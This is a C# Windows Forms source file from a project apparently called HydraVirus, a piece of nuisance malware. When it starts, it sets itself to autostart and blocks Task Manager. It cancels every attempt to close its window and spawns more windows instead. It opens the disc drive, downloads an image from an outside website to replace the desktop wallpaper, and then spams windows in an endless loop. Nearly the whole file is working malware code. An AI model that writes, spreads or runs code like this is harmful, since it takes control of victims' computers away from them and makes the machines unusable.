using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static HydraVirus.WallpaperMgr;

namespace HydraVirus
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
            Payload Payload = new Payload();

            Payload.AutoStart();
            Payload.BlockTaskMgr();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Random random = new Random();

            e.Cancel = true;
            Form2 frm2 = new Form2();
            frm2.StartPosition = FormStartPosition.Manual;
            frm2.Location = new Point(random.Next(0, 1270), random.Next(0, 920));
            frm2.Show();
            Form3 frm3 = new Form3();
            frm3.StartPosition = FormStartPosition.Manual;
            frm3.Location = new Point(random.Next(0, 1270), random.Next(0, 920));
            frm3.Show();
            Form4 frm4 = new Form4();
            frm4.StartPosition = FormStartPosition.Manual;
            frm4.Location = new Point(random.Next(0, 1270), random.Next(0, 920));
            frm4.Show();

            StartPayload();
        }

        public void StartPayload()
        {
            WallpaperMgr WallpaperMgr = new WallpaperMgr();
            Payload Payload = new Payload();

            try
            {
                Payload.OpenDisck();
                string result = Path.GetTempPath();
                using (WebClient webClient = new WebClient())
                {
                    webClient.DownloadFile("https://wallpaperaccess.com/full/844221.jpg", string.Format(result + "\\844221.jpg", Guid.NewGuid().ToString()));
                }
                Set(result + "\\844221.jpg", Style.Stretched);
                new Thread(() =>
                {
                    Thread.Sleep(30000);
                    WindowSpam();
                }).Start();
            }
            catch (Exception ex) { }
        }

        public void WindowSpam()
        {
            while (true)
            {
                Random random = new Random();

                Form2 frm2 = new Form2();
                frm2.StartPosition = FormStartPosition.Manual;
                frm2.Location = new Point(random.Next(0, 1270), random.Next(0, 920));
                frm2.Show();
                Form3 frm3 = new Form3();
                frm3.StartPosition = FormStartPosition.Manual;
                frm3.Location = new Point(random.Next(0, 1270), random.Next(0, 920));
                frm3.Show();
                Form4 frm4 = new Form4();
                frm4.StartPosition = FormStartPosition.Manual;
                frm4.Location = new Point(random.Next(0, 1270), random.Next(0, 920));
                frm4.Show();
            }
        }
    }
}
